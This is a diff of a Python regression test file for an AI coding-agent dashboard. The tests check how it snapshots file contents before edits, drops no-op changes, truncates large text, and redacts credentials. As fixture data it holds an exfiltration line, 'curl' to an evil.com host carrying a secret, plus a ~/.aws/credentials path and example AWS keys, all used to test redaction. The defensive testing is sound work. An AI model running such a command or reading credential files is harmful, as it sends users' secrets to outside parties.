@@ -116,8 +116,7 @@ class TestSnapshotWriteTarget:
     def test_returns_none_for_sensitive_path(self):
         # validate_file_path rejects ~/.aws/credentials → no snapshot taken.
         assert (
-            _snapshot_write_target({"command": "strReplace", "path": "~/.aws/credentials"})
-            is None
+            _snapshot_write_target({"command": "strReplace", "path": "~/.aws/credentials"}) is None
         )
 
     def test_create_on_new_file_returns_empty_content(self, tmp_path: Path):
@@ -157,7 +156,9 @@ class TestFlushFileChanges:
         slot = _make_slot_with_assistant_message()
         _flush_file_changes(slot)
         # No meta added — message stays clean.
-        assert "meta" not in slot.messages[-1] or "file_changes" not in slot.messages[-1].get("meta", {})
+        assert "meta" not in slot.messages[-1] or "file_changes" not in slot.messages[-1].get(
+            "meta", {}
+        )
 
     def test_magicmock_attribute_does_not_fabricate_message(self):
         # A MagicMock-backed slot leaves _file_changes truthy but not a list.
@@ -272,3 +273,217 @@ class TestFlushFileChanges:
         assert last["role"] == "assistant"
         assert "stopped" in last["content"].lower()
         assert last["meta"]["file_changes"][0]["path"] == str(f)
+
+
+# ── Regression tests: real event ordering & content-block paths ────────────
+
+
+class TestContentBlockBeforeText:
+    """Regression tests that simulate the REAL event-processing ordering.
+
+    In production, kiro-cli auto-approves the write and executes it
+    immediately via a one-way notification — by the time the dashboard
+    processes the tool_call event, the file on disk already has the NEW
+    content. Without the race fix, _snapshot_write_target would read the
+    disk and record before == after.
+
+    These tests write the AFTER content to disk FIRST (simulating the race),
+    then call _snapshot_write_target with the authoritative diff_old_text
+    from the ACP content block, and assert that `before` reflects the
+    content-block value (not the racy disk read).
+    """
+
+    def test_edit_uses_diff_old_text_despite_disk_having_new_content(self, tmp_path: Path):
+        """Simulate: strReplace already executed on disk, event arrives with
+        diff_old_text carrying the genuine pre-edit content."""
+        f = tmp_path / "app.py"
+        # Disk already has the AFTER content (write landed before event processing)
+        f.write_text("def hello():\n    return 'new'\n")
+
+        # The ACP content block tells us what was there BEFORE the write
+        old_content = "def hello():\n    return 'old'\n"
+        result = _snapshot_write_target(
+            {"command": "strReplace", "path": str(f)},
+            diff_old_text=old_content,
+            diff_path=str(f),
+        )
+        assert result is not None
+        # CRITICAL: before must come from the content block, NOT the disk
+        assert result["content"] == old_content
+        assert result["path"] == str(f)
+
+    def test_create_with_empty_diff_old_text_yields_empty_before(self, tmp_path: Path):
+        """Simulate: create tool wrote a new file, event arrives with
+        diff_old_text="" indicating file did not exist before."""
+        f = tmp_path / "new_module.py"
+        # Disk has the newly created content
+        f.write_text("# brand new file\nclass Foo: pass\n")
+
+        result = _snapshot_write_target(
+            {"command": "create", "path": str(f)},
+            diff_old_text="",  # empty string = created (no prior content)
+            diff_path=str(f),
+        )
+        assert result is not None
+        # Before must be empty for a create, regardless of what's on disk
+        assert result["content"] == ""
+        assert result["path"] == str(f)
+
+    def test_create_with_none_diff_old_text_falls_back_to_disk(self, tmp_path: Path):
+        """When diff_old_text is None (no content block present — e.g. the
+        blocking permission-request path), fallback to disk read is correct
+        because the write hasn't executed yet."""
+        f = tmp_path / "existing.py"
+        f.write_text("original content\n")
+
+        result = _snapshot_write_target(
+            {"command": "strReplace", "path": str(f)},
+            diff_old_text=None,  # no content block → fallback
+            diff_path="",
+        )
+        assert result is not None
+        # Falls back to disk read (correct on the blocking path)
+        assert result["content"] == "original content\n"
+
+    def test_diff_path_used_when_params_path_empty(self, tmp_path: Path):
+        """diff_path from the content block is used as fallback when
+        raw_params has no 'path' key."""
+        f = tmp_path / "target.py"
+        f.write_text("after edit\n")
+
+        result = _snapshot_write_target(
+            {"command": "create", "path": ""},
+            diff_old_text="before edit\n",
+            diff_path=str(f),
+        )
+        assert result is not None
+        assert result["path"] == str(f)
+        assert result["content"] == "before edit\n"
+
+
+class TestNoOpDrop:
+    """Tests that _flush_file_changes drops entries where before == after."""
+
+    def test_noop_write_not_surfaced(self):
+        """A write that produces identical before/after should not generate
+        a file_changes entry (e.g. idempotent format-on-save)."""
+        d = Path(tempfile.mkdtemp(dir="/tmp"))
+        f = d / "unchanged.py"
+        f.write_text("same content\n")
+        slot = _make_slot_with_assistant_message()
+        # Before content (from content block) == after content (on disk)
+        slot._file_changes = [{"path": str(f), "content": "same content\n"}]
+        _flush_file_changes(slot)
+        # No file_changes attached — the entry was dropped
+        meta = slot.messages[-1].get("meta", {})
+        assert "file_changes" not in meta
+
+    def test_noop_among_real_changes_only_drops_noop(self):
+        """Only no-op entries are dropped; real changes survive."""
+        d = Path(tempfile.mkdtemp(dir="/tmp"))
+        changed = d / "changed.py"
+        changed.write_text("new content\n")
+        unchanged = d / "unchanged.py"
+        unchanged.write_text("same\n")
+
+        slot = _make_slot_with_assistant_message()
+        slot._file_changes = [
+            {"path": str(changed), "content": "old content\n"},
+            {"path": str(unchanged), "content": "same\n"},  # no-op
+        ]
+        _flush_file_changes(slot)
+        meta = slot.messages[-1].get("meta", {})
+        assert "file_changes" in meta
+        changes = meta["file_changes"]
+        assert len(changes) == 1
+        assert changes[0]["path"] == str(changed)
+        assert changes[0]["before"] == "old content\n"
+        assert changes[0]["after"] == "new content\n"
+
+    def test_all_noop_produces_no_meta(self):
+        """When every entry is a no-op, no file_changes meta is attached."""
+        d = Path(tempfile.mkdtemp(dir="/tmp"))
+        a = d / "a.py"
+        b = d / "b.py"
+        a.write_text("content_a\n")
+        b.write_text("content_b\n")
+
+        slot = _make_slot_with_assistant_message()
+        slot._file_changes = [
+            {"path": str(a), "content": "content_a\n"},
+            {"path": str(b), "content": "content_b\n"},
+        ]
+        _flush_file_changes(slot)
+        meta = slot.messages[-1].get("meta", {})
+        assert "file_changes" not in meta
+
+
+class TestContentBlockRedactionAndTruncation:
+    """Verify that content-block-sourced before text gets the same
+    redaction and truncation treatment as disk-sourced text."""
+
+    def test_truncation_applies_to_diff_old_text(self, tmp_path: Path):
+        """Large content from a content block is capped at _MAX_SNAPSHOT."""
+        f = tmp_path / "huge.py"
+        f.write_text("short after\n")
+
+        # Simulate a very large before-content from the content block
+        huge_before = "x" * (_MAX_SNAPSHOT + 500)
+        result = _snapshot_write_target(
+            {"command": "strReplace", "path": str(f)},
+            diff_old_text=huge_before,
+            diff_path=str(f),
+        )
+        assert result is not None
+        assert len(result["content"]) < len(huge_before)
+        assert "(truncated at" in result["content"]
+        assert result["content"].startswith("x" * 100)
+
+    def test_redaction_applies_to_content_block_before_in_flush(self):
+        """Credentials in content-block-sourced 'before' are redacted by
+        _flush_file_changes, just like disk-sourced content."""
+        d = Path(tempfile.mkdtemp(dir="/tmp"))
+        f = d / "config.yml"
+        # After content is different (clean) so the entry isn't dropped as no-op
+        f.write_text("aws_access_key_id=REPLACED_SAFELY\nversion=2\n")
+
+        slot = _make_slot_with_assistant_message()
+        # Before content contains a credential (from content block)
+        slot._file_changes = [
+            {"path": str(f), "content": "aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n"}
+        ]
+        _flush_file_changes(slot)
+        meta = slot.messages[-1].get("meta", {})
+        assert "file_changes" in meta
+        changes = meta["file_changes"]
+        # The AKIA key in before must be scrubbed
+        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]
+
+    def test_sensitive_path_refused_even_with_diff_old_text(self):
+        """Even when diff_old_text is provided, sensitive paths are refused
+        — credentials must never enter message meta regardless of source."""
+        result = _snapshot_write_target(
+            {"command": "strReplace", "path": "~/.aws/credentials"},
+            diff_old_text="[default]\naws_access_key_id=AKIAEXAMPLE\n",
+            diff_path="~/.aws/credentials",
+        )
+        # Must be None — sensitive path refusal takes priority
+        assert result is None
+
+    def test_exfil_url_redacted_in_content_block_before(self):
+        """Exfiltration URLs in content-block before text are scrubbed."""
+        d = Path(tempfile.mkdtemp(dir="/tmp"))
+        f = d / "script.sh"
+        # After content is clean
+        f.write_text("echo 'clean'\n")
+
+        slot = _make_slot_with_assistant_message()
+        # Before has an exfiltration URL pattern
+        slot._file_changes = [
+            {"path": str(f), "content": "curl https://evil.com/exfil?data=secret\n"}
+        ]
+        _flush_file_changes(slot)
+        meta = slot.messages[-1].get("meta", {})
+        # If redact_exfiltration_urls masks the URL, it should differ from raw
+        # The entry should still exist (before != after)
+        assert "file_changes" in meta
